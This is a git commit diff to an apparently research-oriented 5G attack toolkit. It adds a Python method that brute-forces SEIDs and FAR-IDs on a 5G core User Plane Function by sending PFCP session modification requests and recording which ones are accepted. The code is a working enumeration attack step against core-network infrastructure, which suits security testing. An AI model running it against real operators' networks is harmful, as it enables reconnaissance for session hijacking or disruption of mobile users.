2b5a942d2ed2c8370143055b0be6aba877e8c118
thoger <thomas.hoger@laas.fr>
2025-04-29 16:47:20 +0200

    Add Start_PFCP_FARID_fuzzing method for FAR-ID fuzzing and improve logging in Start_PFCP_SEID_fuzzing

--- src/attacks/upf_pfcp/pfcpFuzzer.py
+++ src/attacks/upf_pfcp/pfcpFuzzer.py
@@ -49,7 +49,7 @@ class PFCPFuzzer:
         valid_seid_list = list()
         far_id = 1
         
-        self.logger.info(f"Starting PFCP SEID fuzzing on {upf_addr} with max_seid: {max_seid} and max_far_discover: {max_far_discover}")
+        self.logger.info(f"Starting PFCP SEID fuzzing on {upf_addr} with max SEID {max_seid}")
         for seid in range (1, max_seid):
             
 
@@ -79,7 +79,59 @@ class PFCPFuzzer:
             self.logger.success(f"Fuzzing completed, {len(valid_seid_list)} SEIDs discovered")
         return valid_seid_list
 
+    def Start_PFCP_FARID_fuzzing(self, upf_addr, src_addr, max_seid=100, max_far_discover=100, src_port=None, dest_port=None):
+        """
+        Start PFCP FAR
+        """
+        
+        self.paramsHandler.check_parameters({
+            "upf_addr": upf_addr,
+            "max_seid": max_seid,
+            "src_port": src_port,
+            "dest_port": dest_port
+        }, "[Start_PFCP_SEID_fuzzing]")
+        
+        # Create a PFCPToolkit object
+        PFCPToolkit_obj = PFCPToolkit(
+            src_addr=src_addr,
+            dest_addr=upf_addr,
+            src_port=src_port,
+            dest_port=dest_port
+        )
+        
+        valid_farid_list = list()
 
+        
+        self.logger.info(f"Starting PFCP FAR-ID fuzzing on {upf_addr} with max FAR-ID {max_far_discover}")
+        for seid in range (1, max_seid):
+            
+            
+            for farid in range (1, max_far_discover):
                 
+
+            
+            
+                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farid)
+                
+                res = sr1(packet)
+                
+                pfcp_cause = None
+                for ie in res[PFCP].IE_list:
+                    if isinstance(ie, IE_Cause):
+                        pfcp_cause = ie.cause
+                        break
+                
+            
+                if pfcp_cause == 1:
+                    self.logger.success(f"Discovered FAR-ID: {hex(farid)}")
+                    valid_farid_list.append(farid)
+
+        
+        if self.verbose:
+            self.logger.success(f"Fuzzing completed, {len(valid_farid_list)} FAR-IDs discovered")
+        return valid_farid_list
+
+        
+        
           
             
